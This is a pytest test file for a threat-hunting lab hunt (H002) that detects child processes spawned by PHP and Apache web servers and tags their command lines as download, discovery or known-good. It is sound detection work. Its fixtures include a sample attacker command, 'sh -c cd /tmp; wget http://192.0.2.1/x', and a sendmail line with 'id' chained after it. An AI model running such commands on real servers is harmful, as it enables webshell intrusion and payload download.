"""Tests for hunt H002 (Milestone 7)."""

import json
import re
from pathlib import Path

import pytest

from threathunt_lab import hunt_php
from threathunt_lab.__main__ import main
from threathunt_lab.hunt import run_hunt
from threathunt_lab.loader import PHP_EVENTS_PATH

ROOT = Path(__file__).resolve().parents[1]
HUNT_DOC = ROOT / "hunts" / "H002-php-web-server-children.md"
WALKTHROUGH = ROOT / "docs" / "php2shell-investigation.md"


def child_of(make_event, parent_name, command_line="sh -c id"):
    event = make_event()
    event["process"]["parent"]["name"] = parent_name
    event["process"]["command_line"] = command_line
    return event


@pytest.mark.parametrize(
    ("parent_name", "expected"),
    [("php-fpm8.3", True), ("PHP-FPM", True), ("apache2", True), ("httpd", True), ("php8.3", False), ("cron", False)],
)
def test_is_web_child(make_event, parent_name, expected):
    assert hunt_php.is_web_child(child_of(make_event, parent_name)) is expected


@pytest.mark.parametrize(
    ("command_line", "expected"),
    [
        ("sh -c /usr/sbin/sendmail -t -i", ["known_good"]),
        ("sh -c /usr/sbin/sendmail -t -i; id", ["discovery"]),  # not exactly the mail command
        ("sh -c cd /tmp; wget http://192.0.2.1/x", ["download", "tmp_folder", "ip_address"]),
        ("sh -c convert video.mp4 thumb.jpg", []),  # "id" inside "video" doesn't count
    ],
)
def test_features(make_event, command_line, expected):
    assert hunt_php.features(child_of(make_event, "php-fpm8.3", command_line)) == expected


def test_hunt_h002_command(capsys):
    assert main(["hunt", "--hunt", "H002", "--step", "Q2"]) == 0
    output = capsys.readouterr().out
    assert "== Q2 What do web servers start? ==" in output
    assert "== Q3" not in output


def test_hunt_rejects_unknown_step(capsys):
    assert main(["hunt", "--hunt", "H002", "--step", "Q7"]) == 2
    assert "Unknown step(s) for H002: Q7" in capsys.readouterr().err


@pytest.mark.parametrize("doc", [HUNT_DOC, WALKTHROUGH])
def test_write_up_quotes_real_hunt_output(capsys, doc):
    run_hunt(json.loads((ROOT / PHP_EVENTS_PATH).read_text(encoding="utf-8")), steps=hunt_php.STEPS)
    output = capsys.readouterr().out
    blocks = re.findall(r"```text\n(.*?)\n```", doc.read_text(encoding="utf-8"), re.DOTALL)
    assert blocks
    for block in blocks:
        assert block in output, f"not produced by the hunt:\n{block}"
